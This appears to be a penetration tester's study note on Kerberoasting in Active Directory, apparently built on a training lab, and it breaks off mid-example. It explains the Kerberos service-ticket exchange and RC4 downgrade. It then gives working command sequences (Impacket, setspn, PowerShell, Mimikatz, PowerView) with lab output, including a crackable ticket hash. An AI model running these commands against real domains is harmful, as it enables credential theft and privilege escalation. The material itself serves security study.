---
created: 2026-07-29
updated: 2026-10-15
tags:
  - AD
  - AD_attacks
  - Kerberos
status: substantial
---

// how to address clock skew?
## Kerberoasting

> **Kerberoasting** is an attack where an authenticated domain user requests Kerberos **Service Tickets (STs)** for accounts registered with **Service Principal Names (SPNs)** and extracts the encrypted ticket payloads to later crack the service account passwords offline.

- As the name suggests, the attack targets the [[Kerberos]] authentication protocol in Active Directory environments.
- Rather than exploiting a software vulnerability, Kerberoasting abuses *legitimate, intended behavior* of the Kerberos protocol during the `TGS-REQ` / `TGS-REP` exchange.
- Kerberoasting requires a **valid authentication context** withing the domain (any low-privileged domain account) — a valid password, an NTLM hash ([[Pass-the-Hash]]), a domain-joined shell session, or a Linux `keytab` flie.
- What you can't use is an **anonymous** context (the KDC won't issue tickets to nobody).
- The traffic the attack generates resembles normal domain operation: standard ticket request, standard Kerberos events — no failed logons (`4625`), no account lockouts.
- The obtained tickets are cracked **entirely offline**: no network traffic or failed login attempts during brute-force. Besides, this is fast (since no packets hit the network).

> [!note] See [[Kerberos]] to learn more about the protocol and how it works.

>[!interesting] The technique got its name — and its fame — from **Tim Medin's** talk *[`Attacking Kerberos: Kicking the Guard Dog of Hades`](https://www.youtube.com/watch?v=HHJWfG9b0-E)* (2014).

- Prerequisites for the attack:
	- **Any valid domain credentials** (a password, an NTLM hash ([[Pass-the-Hash]]), a domain-joined shell session, or a Linux `keytab` file).
	- **Network connectivity to a Domain Controller**  (TCP/UDP port `88`, Kerberos).
	- **Target account(s) with SPNs (Service Principal Names)** assigned.

>[!note]+ Terminology issue 
>A common misnomer I often encounter: calling requested tickets "TGS tickets". In Kerberos spec ([`RFC 4120`](https://www.rfc-editor.org/info/rfc4120)), **TGS** refers to the **Ticket-Granting Server** (a service component of the Key Distribution Center). The issued tickets are **Service Tickets (STs)**.
## How Kerberoasting works

### On the TGS exchange

- During the TGS exchange, the client presents a TGT (Ticket-Granting Ticket) previously obtained from the AS (Authentication Server) to the TGS (Ticket-Granting Server) to obtain a ST (Service Ticket) to access a specific service. 
- The key part here is that **the TGS does not verify whether the requesting user is allowed to use the service**. When a client presents a valid TGT and asks for a ticket for *any* registered SPN, the TGS issues it — regardless of whether the client has any business touching that service. The TGS's job is to prove identity, not to enforce service authorization (that's left to the service itself, or to dedicated mechanisms like constrained delegation).

### On STs

- An ST the TGS generates contains the client's identity, a fresh service session key, ticket lifetime, some flags, and the PAC. The ticket is encrypted with the **target service account's long-term secret key derived from that account's password**.
- Indeed, the client can't read the ticket — but that doesn't matter; what you need is the encrypted blob.
- The ticket is encrypted with a key that is an output of a _deterministic function of the service account's password_. You take the blob, derive keys from candidate passwords, and attempt to decrypt the ticket. When decryption succeeds — you found the password. 

### Kerberoasting exchange

0. **AS exchange**
	- You first authenticate to the domain using any valid user account and obtain a TGT (Ticket-Granting Ticket) from the Authentication Server (AS). This TGT is needed to request service tickets from the KDC.
1. **`KRB_TGS_REQ` (Service Ticket request)**
	- Then you send a `TGS-REQ` to the TGS (Ticket-Granting Service) that includes the previously obtained TGT, an authenticator, and the target **SPN (Service Principal Name)** (e.g., `MSSQLSvc/sql01.corp.local:1433`).
2. **KDC processing**
	- The KDC validates the TGT (using the `krbtgt` account key) and verifies the authenticator (using the TGT session key).
	- It searches Active Directory for the requested SPN and identifies the service account to which it is registered.
	- **No authorization check is performed at this stage.** *Any authenticated domain user can request a service ticket for any valid SPN*, regardless of whether they are permitted to access the service.
3. **`KRB_TGS_REP` (reply)**
	- The KDC generates a random session key (`K_C,S`) and constructs the ST, which contains the client's identity, ticket lifetime, PAC (Privilege Attribute Certificate), and the session key itself. The ticket is encrypted using the **long-term key of the target service account**.
	- The reply (`TGS-REP`) with the encrypted service ticket is then returned to you.
4. **Offline cracking** (roasting)
	- You extract the encrypted service ticket from the `TGS-REP` and crack the ticket offline (for each candidate password, derive the service account's key and try to decrypt the ST) to get the cleartext password of the target account. 

> [!important]+ Cross-domain attacks
>- If there's an external or forest trust that permits authentication across the boundary, you can request and roast tickets for accounts (which have SPNs assigned) in **other domains** domain — the requesting user just needs to be able to authenticate in that realm.

>[!important]+ Which accounts to target
> - By default, **computer accounts** in Active Directory (`COMPUTER$`) have **120-character randomly-generated passwords** rotated automatically every 30 days. Even the fastest GPU rig isn't cracking that offline within any realistic timeframe — these are a dead end for roasting.
> - The same applies to **group Managed Service Accounts (gMSAs)** (240-character randomly-generated passwords, rotated automatically).
> - **User service accounts** (`svc_sql`, `svc_backup`, `dev_db`, etc.) are the real target. Their passwords are chosen by human administrators, and humans pick bad passwords.

>[!important] Before requesting tickets, **enumerate which accounts even have SPNs**.

### Why SPNs?

- A **Service Principal Name (SPN)** is a unique identifier for a service instance. It maps a service (e.g., SQL Server, IIS, or an SMB file server) to an Active Directory account.
- For example, an SPN `MSSQLSvc/sql01.corp.local:1433` is registered in `svg_sql`. 
- When a client wants to connect to the SQL Server, it does not ask for a ticket to **`svc_sql`**. Instead, it requests a ticket for the SPN, `MSSQLSvc/sql01.corp.local:1433`. 
- The KDC then looks up the SPN in Active Directory, determines that it belongs to `svg_sql`, encrypts the service ticket using `svg_sql`'s long-term key, and returns the ticket to the client.
- Without SPNs, the KDC would not know **which account owns a particular service**, and therefore would not know which key to use when issuing a service ticket.

>[!important] Accounts without SPNs cannot be Kerberoasted because no service tickets are issued for them.

>[!note] See [[Kerberos#SPNs]].
### Targeted Kerberoasting

- If you're after privilege escalation rather than just a foothold, target **high-value accounts** — those flagged `adminCount=1`, i.e., members of privileged groups like `Domain Admins`.

>[!info] `adminCount` is set when a user is added to a protected group and is **never automatically cleared**. So it marks both current *and* former privileged accounts.

>[!note] Former privileged accounts may still keep powerful privileges.

## Encryption types and the RC4 problem

- Whether a ticket is worth roasting — and how long it takes — depends entirely on which encryption type (`enctype`) the KDC used to seal it.

- Encryption types in Kerberos:

| Encryption type (`enctype`) | Value         | Hashcat mode | Notes                                                                                                                                      |
| --------------------------- | ------------- | ------------ | ------------------------------------------------------------------------------------------------------------------------------------------ |
| `RC4-HMAC`                  | `23` (`0x17`) | `13100`      | The RC4 key is **derived directly from the account's NTLM hash**; can often be cracked almost as fast as NTLM hashes (meaning, very fast). |
| `AES128-CTS-HMAC-SHA1-96`   | `17` (`0x11`) | `19600`      | Key derivation uses PBKDF2 with **4,096 iterations**; significantly slower to crack.                                                       |
| `AES256-CTS-HMAC-SHA1-96`   | `18` (`0x12`) | `19700`      | Same PBKDF2 cost, bigger key; **slowest** of the three to crack.                                                                           |

> [!note] Other `enctype`s (such as DES) are deprecated and disabled by default; in practice you will only ever see RC4, AES-128, or AES-256 on real domains.

- The LDAP attribute `msDS-SupportedEncryptionTypes` on the account object controls what the KDC is allowed to use for that account:

```powershell
Get-DomainUser testspn -Properties samaccountname, serviceprincipalname, msds-supportedencryptiontypes
```

| Value         | Decription                                                                                            |
| ------------- | ----------------------------------------------------------------------------------------------------- |
| `0`           | Undefined / default (both RC4 and AES remain usable, subject to domain policy).                       |
| `4`           | RC4 only.                                                                                             |
| `8`           | AES-128 only.                                                                                         |
| `16`          | AES-256 only.                                                                                         |
| `24` (`0x18`) | AES-128 **and** AES-256, **no RC4**. This is the setting to check when assessing downgrade potential. |
| `28`          | AES-128, AES-256 *and* RC4.                                                                           |

- Hashcat modes for cracking tickets:

| Encryption           | Ticket format     | Hashcat mode |
| -------------------- | ----------------- | ------------ |
| RC4 (`etype 23`)     | `$krb5tgs$23$...` | `13100`      |
| AES-128 (`etype 17`) | `$krb5tgs$17$...` | `19600`      |
| AES-256 (`etype 18`) | `$krb5tgs$18$...` | `19700`      |

>[!important]+ The RC4 downgrade (`/tgtdeleg`)
> - Since AES is much more expensive to crack than RC4, if possible, try to find a way to obtain **RC4** tickets even when the target account supports AES. 
> - The **`/tgtdeleg`** option in `Rubeus` does exactly that: it abuses the KDC's delegation handling to obtain a TGT for the current user *without knowing the user's password*, and negotiates the exchange in a way that forces **RC4**.
> ```powershell
> Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
> ```
>- Whether the downgrade *works* depends on which Domain Controller OS you're dealing with (Windows Server 2016 or older are susceptible to downgrade; Windows Server 2019/2022 or newer ignore client preferences and issue AES-256 tickets).
## Executing Kerberoasting

### Kerberoasting from Linux (`GetUserSPNs.py`)

// explain how we authenticate to the domain in this case, as which account


- From a Linux machine, use the `Impacket`'s [`GetUserSPNs.py`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py). 
- It queries the DC via **LDAP** to find user accounts with SPNs, fires `TGS-REQ` requests, and outputs hashes in a format both Hashcat and JohnTheRipper can work with.

- Request tickets for all user accounts with SPNs:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name -request -outputfile SPNS
```

>[!example]-
> ```bash
> GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/hporter -request -outputfile SPNS
> ```
> 
> ```bash
> Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 
> 
> Password:
> ServicePrincipalName                         Name          MemberOf  PasswordLastSet             LastLogon                   Delegation 
> -------------------------------------------  ------------  --------  --------------------------  --------------------------  ----------
> adfsconnect/azure01.inlanefreight.local      azureconnect            2022-06-01 14:32:56.506935  <never>                                
> backupjob/veam001.inlanefreight.local        backupjob               2022-06-01 14:33:00.038178  <never>                                
> MSSQLSvc/DB01.inlanefreight.local:1433       mssqlsvc                2022-06-01 14:32:31.178803  <never>                                
> MSSQLSvc/DEVTEST.inlanefreight.local:1433    sqltest                 2022-06-01 14:32:45.522556  <never>                                
> MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                   2022-06-01 14:32:49.256932  <never>                                
> MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev                  2022-06-01 14:32:41.913173  <never>                                
> MSSQLSvc/SQL-WEB01.inlanefreight.local:1433  mssqladm                2022-06-01 14:32:52.897615  2026-10-10 10:49:07.119135             
> MSSQLSvc/SQL01.inlanefreight.local:1433      svc_sql                 2022-06-01 14:32:34.850677  <never>                                
> MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod                 2022-06-01 14:32:38.381946  <never>                                
> SAP/APP01.inlanefreight.local                sapsso                  2022-06-01 14:33:07.225672  <never>                                
> SAPsvc/SAP01.inlanefreight.local             sapvc                   2022-06-01 14:33:10.678799  <never>                                
> vmware/vc.inlanefreight.local                vmwarescvc              2022-06-01 14:33:03.600665  <never>                                
> 
> 
> 
> [-] CCache file is not found. Skipping...
> ```
> 
> 
> ```bash
> cat SPNS | grep backupjob
> $krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$309c9b686162b14b12e4ac4e2176fc83$ac145bb544680fa02e039cb49eb59f2d5fc4e65798a8b29484929856ddf1c78fb553a344f706a0f5205c8bbe2a30dab9bff560923ff6c4fb4f1448d7f356a857ad44d26941c4af744e15439d914c71eb02335994a9c4fabc986646abe20571176c8c9bf5738e636e69c4864df4a289af86e5e86690f7e87defd64daf780ade15469a750ca1bb528ce4b3e57ca7b358787d10da71800d4cc5d967677a8940da9b7047ad655ab19fc5d0338ddd1cf1e20053b55e7d01c26fe69c91cb12e577f997416a5ecbd260482fc7962a489481c22409c37601909bb5cb010b98ef3f64f6d79a625c35020b643fe35c9902b628a8a145c9a9dcd5e864dba02946cd79c140a36081132cb5b39ba757a2052dae5707144393ccd6109baa0b672230dd688dbfcb8e994da9d8205c85e2a2e8f6d34c4689d7635d46c7b12dc262d8c47c8d70b26a06835d3dee96fa97b37f6caaeabd052e424d64dde2f5b7a4aa5d0f00abeeeae7ce2c11c992afe587efa4e8296cf3cc568436dfafc13171851c9ba73248b4a466615d3c53dc76aed4c6fb6428c8a848ebb14a89250eb3f89118a59c23a2702a2d2707d2b2f1ea16ae9043515582c1787a42aae004b3381473bdc1910307ede1f97004eb93a9bff74447d9c10f4edf1716bbd973e0b689042d00e954a034cc03ffc282062e1e9792860f5ecc22378bd0a5f87c40889d7ca3f0f34410c568788f32659ec866380b100b9af13d09ab53615c89c25ea41d77c2047cfc2183f1296318d337537b73d1fbca6b602b3605f9266f8b8e524b2e1e241c9b0cf4810c3e4c1aa43b97bba4f3e0cab65a3c2a4db941d7e3eee33520dda810c56dfd1435d6223d3bb9bf182fd81b3d25500fa5925584da06f5a77d6051deebf8dbe8e1e0310b8e089daf210933fa5fa75353a07d15851cd8352270b56a56e6e4fbce2308f5b1f2fef3c707faa71d8cf37ef5f3d4c68e4b0c6725f8b2dc1ec60166ea4c74621ca5fff1d3792c9c53473e7eb4158b4c09ba9cc44bc79226d995e13cdbdeeb631f62ba91fb79b4818fb5cb3e17a48f5a291ea772c1bb6655616a67417e5ab03077976b6f7a6aafa330bc5e35328834fffa9173319abb8067e3d73be25eafd17a627fa8d954e3ac61bdbdc9c8e0b7cb71684697ab2405a205895ffdd58c1fcc0f8afddfc19a910c93b0cd9f12b14871e8e6650bb097cd389b6bc37fe36e2e6e5430550e61753fd19c106762827d57d7d1b6c0b57a0860229392db302e4f7e7e0147105eb333bae38692861c29ec732ebff026e7c64b6483650961543db7e4c4416df6162ee687e03fff3409aab92aa407a5257bac9da5f82cce7bf63727
> ```

- Request a ticket for one specific account:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name -request-user sqldev
```

>[!note] You will be prompted for a password (for your current account), unless `-hashes` or `-k`  is used.

- Use NTLM hash instead of a password:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -request
```

- Use an existing Kerberos ticket cache:

```bash
export KRB5CCNAME=/path/to/ticket.ccache
GetUserSPNs.py -k -no-pass -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name -request
```

| Option           | Description                                                                                                             |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------- |
| `-dc-ip`         | IP address of the domain controller; of omitted, defaults to the domain FQDN; ignored if `-target-domain` is specified. |
| `-target-domain` | Domain to query if different than the current domain (cross-domain Kerberoasting).                                      |
| `-request`       | Requests STs for users and outputs them in JtR/Hashcat format (default: `false`).                                       |
| `-request-user`  | Requests STs for the SPN associated with the specified user (just the username, no domain is needed).                   |
| `-outputfile`    | Output filename (JtR/Hashcat format); auto-selects `-request`.                                                          |

### Kerberoasting from Windows (semi-manual approach)

#### `1.` Enumerating SPNs using `setspn.exe`

- The built-in [`setspn.exe`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn) queries Active Directory for registered SPNs:

```cmd
setspn.exe -Q */*
```

>[!example]-
> ```powershell
> PS C:\Tools> setspn.exe -Q */*
> ```
> 
> ```powershell
> Checking domain DC=INLANEFREIGHT,DC=LOCAL
> CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
>         exchangeAB/ACADEMY-EA-DC01
>         exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         TERMSRV/ACADEMY-EA-DC01
>         TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
>         ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
>         DNS/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         GC/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-DC01
>         RPC/dfca7c4d-e949-4ef8-bb02-8cd0fe2e13f8._msdcs.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-DC01/INLANEFREIGHT
>         HOST/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
>         HOST/ACADEMY-EA-DC01
>         HOST/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
>         E3514235-4B06-11D1-AB04-00C04FC2DCD2/dfca7c4d-e949-4ef8-bb02-8cd0fe2e13f8/INLANEFREIGHT.LOCAL
>         ldap/ACADEMY-EA-DC01/INLANEFREIGHT
>         ldap/dfca7c4d-e949-4ef8-bb02-8cd0fe2e13f8._msdcs.INLANEFREIGHT.LOCAL
>         ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
>         ldap/ACADEMY-EA-DC01
>         ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
> CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         kadmin/changepw
> CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         WSMAN/ACADEMY-EA-MS01
>         WSMAN/ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
>         TERMSRV/ACADEMY-EA-MS01
>         TERMSRV/ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
>         tapinego/ACADEMY-EA-MS01
>         tapinego/ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-MS01
>         HOST/ACADEMY-EA-MS01
>         RestrictedKrbHost/ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
> CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
>         MSSQL/ACADEMY-EA-FILE
> CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         IMAP/ACADEMY-EA-MX01
>         IMAP/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         IMAP4/ACADEMY-EA-MX01
>         IMAP4/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         POP/ACADEMY-EA-MX01
>         POP/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         POP3/ACADEMY-EA-MX01
>         POP3/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         exchangeRFR/ACADEMY-EA-MX01
>         exchangeRFR/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         exchangeAB/ACADEMY-EA-MX01
>         exchangeAB/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         exchangeMDB/ACADEMY-EA-MX01
>         exchangeMDB/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         SMTP/ACADEMY-EA-MX01
>         SMTP/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         SmtpSvc/ACADEMY-EA-MX01
>         SmtpSvc/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         WSMAN/ACADEMY-EA-MX01
>         WSMAN/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         TERMSRV/ACADEMY-EA-MX01
>         TERMSRV/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-MX01
>         HOST/ACADEMY-EA-MX01
>         RestrictedKrbHost/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
> CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         backupjob/veam001.inlanefreight.local
> CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         sts/inlanefreight.local
> CN=ACADEMY-EA-WS01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
>         TERMSRV/ACADEMY-EA-WS01
>         TERMSRV/ACADEMY-EA-WS01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-WS01
>         HOST/ACADEMY-EA-WS01
>         RestrictedKrbHost/ACADEMY-EA-WS01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-WS01.INLANEFREIGHT.LOCAL
> CN=ACADEMY-EA-CTX1,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
>         WSMAN/ACADEMY-EA-CTX1
>         WSMAN/ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-CTX1
>         HOST/ACADEMY-EA-CTX1
>         RestrictedKrbHost/ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL
> CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         MSSQLSvc/SPSJDB.inlanefreight.local:1433
> CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
> CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
> CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         adfsconnect/azure01.inlanefreight.local
> CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         testspn/kerberoast.inlanefreight.local
> CN=testspn2,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         testspn2/kerberoast.inlanefreight.local
> CN=ACADEMY-EA-FILE,OU=File Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         WSMAN/ACADEMY-EA-FILE
>         WSMAN/ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
>         TERMSRV/ACADEMY-EA-FILE
>         TERMSRV/ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-FILE
>         HOST/ACADEMY-EA-FILE
>         RestrictedKrbHost/ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
> CN=ACADEMY-EA-DB01,OU=Database,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         tapinego/ACADEMY-EA-DB01
>         tapinego/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
>         WSMAN/ACADEMY-EA-DB01
>         WSMAN/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-DB01
>         HOST/ACADEMY-EA-DB01
>         RestrictedKrbHost/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
> CN=ACADEMY-EA-CA01,OU=PKI,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         tapinego/ACADEMY-EA-CA01
>         tapinego/ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
>         WSMAN/ACADEMY-EA-CA01
>         WSMAN/ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-CA01
>         HOST/ACADEMY-EA-CA01
>         RestrictedKrbHost/ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
> CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
> CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         vmware/inlanefreight.local
> CN=SAPService,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         SAPService/srv01.inlanefreight.local
> 
> Existing SPN found!
> ```

- Scope the query to a specific domain:

```cmd
setspn.exe -T EXAMPLE.COM -Q */*
```

> [!note]- Option breakdown
> - `-Q */*`: wildcard query: every service class / hostname registered as an SPN in AD.
> - `-T`: target a specific realm (relevant in multi-domain forests).

#### `2.` Requesting STs

- Request tickets for a target account and load them into memory:

```powershell
Add-Type -AssemblyName System.IdentityModel
```

```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.example.com:1433"
```

> [!note]+ Command breakdown
> - The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add the `System.Identity` .NET class to the current PowerShell session.
> 	- [`System.IdentityModel`](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services.
> - The [`New-Object`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet is used to create an instance of a .NET framework object.
> 	- The [`System.IdentityModel.Tokens`](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [`KerberosRequestorSecurityToken`](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) is used to create a security token and pass the SPN to the class to request a ST for the target account.
>
> This is essentially what [`Rubeus`](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) automates when using the default Kerberoasting method.

- Request tickets for *every* SPN `setspn` found:

```powershell
setspn.exe -T EXAMPLE.COM -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
#### `3.` Extracting tickets from memory using `Mimikatz`

- The requested tickets are now saved to the Kerberos cache. To extract them, use `Mimikatz`'s `kerberos::list` module.
- Base64 to `stdout` (no disk writes):

```powershell
mimikatz.exe "base64 /out:true" "kerberos::list /export" exit
```

 - `.kirbi` files to disk:

```powershell
mimikatz.exe "kerberos::list /export" exit
```

#### `4.` Converting the tickets into Hashcat format

- Convert a Base64-encoded ticket into `.kirbi` format: 

```bash
echo "<Base64_string>" | tr -d '\r\n' | base64 -d > sqldev.kirbi
```

- Use [`kirbi2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/kirbi2john.py) (ships with JohnTheRipper) to convert tickets from `kirbi` files into the format Hashcat can work with:

```bash
python3 kirbi2john.py sqldev.kirbi > sqldev_john.txt
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' sqldev_john.txt > sqldev_hashcat.txt
```

> [!note]- Why the `sed`?
>- `kirbi2john.py` outputs `$krb5tgs$user:hash`. 
>- Hashcat's mode `13100` wants the fields wrapped: `$krb5tgs$23$*user$realm$spn@realm*$hash`. 
>- `sed` reorders the fields into that shape.

### Kerberoasting from Windows (automated with `PowerView`)

- `PowerView` (and its `SharpView` port) bundles LDAP enumeration and ticket requests into a couple of cmdlets:

```powershell
Import-Module .\PowerView.ps1
```

```powershell
Get-DomainUser * -SPN | Select-Object samaccountname, serviceprincipalname
```

>[!example]+
> ```powershell
> Get-DomainUser * -SPN | Select-Object samaccountname, serviceprincipalname
> ```
> 
> ```powershell
> 
> samaccountname serviceprincipalname                       
> -------------- --------------------                       
> azureconnect   adfsconnect/azure01.inlanefreight.local    
> backupjob      backupjob/veam001.inlanefreight.local      
> krbtgt         kadmin/changepw                            
> sqltest        MSSQLSvc/DEVTEST.inlanefreight.local:1433  
> sqlqa          MSSQLSvc/QA001.inlanefreight.local:1433    
> sqldev         MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
> svc_sql        MSSQLSvc/SQL01.inlanefreight.local:1433    
> sqlprod        MSSQLSvc/SQL02.inlanefreight.local:1433   
> ```

- Request and format a single account's ticket for Hashcat:

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

>[!example]
>```bash
> PS C:\windows\system32\inetsrv> Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
> ```
> 
> ```bash
> Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
> 
> 
> SamAccountName       : svc_sql
> DistinguishedName    : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
> TicketByteHexStream  : 
